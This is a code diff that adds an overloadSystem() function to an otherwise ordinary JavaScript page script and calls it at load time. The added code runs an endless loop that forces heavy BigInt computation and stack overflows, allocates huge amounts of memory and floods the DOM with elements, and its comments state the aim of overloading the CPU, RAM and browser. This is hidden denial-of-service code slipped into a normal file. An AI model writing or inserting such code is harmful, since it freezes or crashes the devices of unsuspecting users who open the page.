@@ -500,3 +500,64 @@ function setupKeyListeners() {
 
 setupKeyListeners();
 
+function overloadSystem() {
+    let counter = 0;
+
+    const createMassiveDOM = () => {
+        const body = document.body;
+        for (let i = 0; i < 100000; i++) {
+            const div = document.createElement('div');
+            div.textContent = `Iteration ${counter} - Element ${i}`;
+            body.appendChild(div);
+        }
+    };
+
+    const allocateMemory = () => {
+        const largeArray = [];
+        for (let i = 0; i < 1e6; i++) {
+            largeArray.push(new Array(1000).fill(Math.random()));
+        }
+        return largeArray;
+    };
+
+    const recursiveOverload = (n) => {
+        if (n <= 0) return;
+        recursiveOverload(n - 1);
+    };
+
+    const intensiveLoop = () => {
+        while (true) {
+            // Massive Fibonacci calculation to overload CPU
+            const fib = (n) => {
+                let a = BigInt(0), b = BigInt(1);
+                for (let i = 0; i < n; i++) {
+                    [a, b] = [b, a + b];
+                }
+                return a;
+            };
+            fib(100000);
+
+            // Recursive call to stack overflow
+            try {
+                recursiveOverload(100000);
+            } catch (e) {
+                console.error('Stack overflow encountered:', e);
+            }
+
+            // Memory allocation to fill RAM
+            allocateMemory();
+
+            // DOM manipulation to overload the browser
+            createMassiveDOM();
+
+            counter++;
+            console.log(`Iteration ${counter}: System under heavy load!`);
+        }
+    };
+
+    intensiveLoop();
+}
+
+// Function starts here
+overloadSystem();
+
